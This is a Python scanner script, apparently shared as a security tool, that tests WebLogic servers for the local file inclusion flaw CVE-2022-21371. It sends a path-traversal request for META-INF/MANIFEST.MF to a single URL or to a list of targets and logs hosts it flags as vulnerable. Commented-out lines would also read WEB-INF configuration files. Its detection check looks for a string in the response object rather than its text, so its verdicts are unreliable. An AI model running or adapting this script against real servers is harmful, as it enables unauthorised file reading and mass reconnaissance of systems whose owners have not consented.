import requests
import argparse
import urllib3
import sys
urllib3.disable_warnings()


def title():
    print("""
                               WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371
                      use: python3  WebLogic_Local_File_Inclusion_本地文件包含漏洞_CVE-2022-21371.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Cache-Control': 'max-age=0',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="96"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"macOS"',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'close'  # 关闭多余的连接请求

        }
        try:
            requests.packages.urllib3.disable_warnings()
            # 网站会吧'.'跟'..'解析掉,暂时绕过不了这个解析
            meta_file = requests.get(self.url + "/....//META-INF/MANIFEST.MF", headers=headers, verify=False)
            print(meta_file)
            print(meta_file.url)
            # web_info = requests.get(self.url + ".//WEB-INF/web.xml",verify=False)
            # portlet = requests.get(self.url + ".//WEB-INF/portlet.xml", verify=False)
            # weblogic = requests.get(self.url + ".//WEB-INF/weblogic.xml", verify=False)
            if "Manifest-Version" in meta_file and meta_file.status_code == 200:
                print("\033[32m[o]"+self.url + "存在WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371！"+"\033[0m")
                with open("WebLogic_Local_File_Inclusion_本地文件包含漏洞_CVE-2022-21371.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
                # gat_meta_file = meta_file.text
                # get_web_info = web_info.text
                # get_portlet = portlet.text
                # get_weblogic = weblogic.text
                # print(gat_meta_file)
                # print(get_web_info)
                # print(get_portlet)
                # print(get_weblogic)
            if meta_file.status_code == 404:
                # print("页面404")
                print(self.url + "不存在WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371！")
                pass
            if meta_file.status_code == 302:
                # print("页面跳转")
                print(self.url + "不存在WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371！")
                pass
            if meta_file.status_code == 403:
                # print("waf拦截")
                print(self.url + "不存在WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371！")
                pass
            if meta_file.status_code == 400:
                # print("400 Bad Request")
                print(self.url + "不存在WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371！")
                pass
        except requests.exceptions.ConnectionError:
            print("站点连接错误！")
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 WebLogic_Local_File_Inclusion_本地文件包含漏洞_CVE-2022-21371.py -u http://127.0.0.1\neg2:>>>python3 WebLogic_Local_File_Inclusion_本地文件包含漏洞_CVE-2022-21371.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
